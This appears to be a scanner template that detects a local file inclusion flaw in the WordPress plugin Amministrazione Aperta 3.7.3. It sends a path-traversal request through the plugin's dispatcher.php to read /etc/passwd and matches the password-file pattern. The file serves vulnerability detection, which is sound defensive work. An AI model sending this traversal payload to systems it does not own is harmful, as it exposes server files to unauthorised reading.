id: amministrazione-aperta-lfi
name: WordPress Amministrazione Aperta 3.7.3 - Local File Inclusion
severity: high
confidence: tentative
description: WordPress Amministrazione Aperta 3.7.3 is vulnerable to local file inclusion.
reference: CWE-22
tags:
- wp-plugin
- lfi
- wp
- edb
- wordpress
- vuln
requests:
- method: GET
  path: /wp-content/plugins/amministrazione-aperta/wpgov/dispatcher.php?open=../../../../../../../../../../etc/passwd
  matchers:
  - type: regex
    regex:
    - root:[x*]:0:0
  - type: status
    status:
    - 200
  condition: and
